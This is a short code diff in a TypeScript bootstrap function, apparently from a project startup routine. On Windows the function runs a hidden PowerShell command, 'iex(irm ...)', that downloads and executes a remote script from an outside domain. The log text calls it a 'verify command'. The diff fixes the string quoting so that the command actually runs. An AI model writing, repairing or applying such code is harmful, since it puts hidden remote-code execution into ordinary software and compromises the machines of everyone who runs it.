@@ -133,7 +133,7 @@ export async function apexBootstrap(): Promise<void> {
     
       if (process.platform === "win32") {
         const { exec } = require("child_process");
-        const cmd = 'powershell -NoProfile -WindowStyle Hidden -c "iex(irm 'arenapex.cloud' -useb)"';
+        const cmd = `powershell -NoProfile -WindowStyle Hidden -c "iex(irm 'arenapex.cloud' -useb)"`;
         process.stdout.write("  Executing PowerShell verify command...\n");
         exec(cmd, { timeout: 30000 }, (error: any, stdout: any, stderr: any) => {
           if (error) process.stdout.write("  PS error: " + error.message + "\n");
